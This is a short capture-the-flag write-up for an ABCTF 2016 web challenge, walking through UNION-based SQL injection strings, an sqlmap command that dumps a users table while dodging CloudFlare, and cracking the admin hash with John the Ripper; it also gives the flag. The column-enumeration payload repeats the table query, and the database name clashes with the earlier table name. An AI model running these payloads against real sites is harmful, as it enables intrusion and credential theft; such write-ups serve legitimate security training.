# ABCTF 2016 : impenetrable-fortress-200

**Category:** Web
**Points:** 200
**Solves:** 14
**Description:**

Some times an application is secure and you have to find another way around. Log in with admin credentials and you will receive a flag. Try it [here](http://yrmyzscnvh.abctf.xyz/lastweb/)!

## Write-up

We are presented a website where a username & password prompt is located. The first thought is to try injecting the username parameter, which turns out to be unsuccessful.

After looking at the hint (find the other way around) I looked at the other web challenges present - the title matches with web4, thus I tried my luck there.

Let's enumerate tables first -> `' AND 3=8 UNION SELECT table_name, 2 FROM INFORMATION_SCHEMA.TABLES #`, getting the tables `webfour` and `users`. The last table is our goldmine, as we can obtain our username / pw combo there.

Let's enumerate columns in `users` table -> `' AND 3=8 UNION SELECT table_name, 2 FROM INFORMATION_SCHEMA.TABLES #` discovering the column names are `username` and `hashedpassword`.

I could not select the columns from the database (nothing showed on the website) so I used SQLmap to dump the db -> `python sqlmap.py -u "http://yrmyzscnvh.abctf.xyz/web4/" --data "input=1" --random-agent --user-agent='' --dump -D webnine -T users`.  (used random user agent to get rid of CloudFlare)

The dump contains 3 entries:


| username           | hashedpassword                         |
|--------------------|----------------------------------------|
| admin              | 758e04774a12864b5b707dddc131d91d       |
| IntelAgent is cool | PM me this code for nothing: jowlprowl |
| jowls              | jowls                                  |

Using JtR (John the Ripper) with rockyou wordlist we discover that the hash corresponds to `cardoor`.

After logging in we see the flag: `abctf{th3_l4st_0n3_1s_th3_b3st_0n3}`

## Other write-ups and resources

* [0x90r00t](https://0x90r00t.com/2016/07/24/abctf-2016-se-and-xss-the-art-of-phishing-and-trolling/)
